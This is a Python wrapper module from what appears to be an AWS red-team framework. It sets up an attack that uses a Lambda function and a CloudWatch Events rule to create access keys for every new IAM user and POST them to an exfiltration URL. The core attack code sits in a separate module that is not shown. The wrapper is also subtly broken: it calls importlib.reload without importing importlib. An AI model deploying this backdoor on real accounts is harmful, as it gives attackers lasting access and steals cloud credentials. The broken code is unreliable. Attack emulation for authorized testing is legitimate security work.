#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError
from copy import deepcopy
import subprocess
import random
import string
import os

target = ''

technique_info = {
    'blackbot_id': 'T1098.b.004',
    'external_id': '',
    'controller': 'lambda_backdoor_new_users',
    'services': ['Lambda', 'Events', 'IAM'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--target-role-arn','--exfil-url'],
    'version': '1',
    'aws_namespaces': [],
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'ttp_exec': '',
    'ttp_mitigation': '',
    'ttp_detection': '',
    'intent': 'Creates a Lambda function and CloudWatch Events rule to backdoor new IAM users.',
    'name': 'ADD_NAME_HERE',

}

parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])

parser.add_argument('--target-role-arn', required=True, default=None, help='What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM CreateAccessKey permission')
parser.add_argument('--exfil-url', required=True, default=None, help='The URL to POST backdoor credentials to, so you can access them.')


def main(args, awsattack_main):
    args = parser.parse_args(args)

    import_path = 'ttp.src.lambda_backdoor_new_users_src'
    src_code = __import__(import_path, globals(), locals(), ['technique_info'], 0)
    importlib.reload(src_code)

    awsattack_main.chain = True
    return src_code.main(args, awsattack_main)


def summary(data, awsattack_main):
    return '  Lambda functions created: {}\n  CloudWatch Events rules created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['rules_created'], data['successes'])
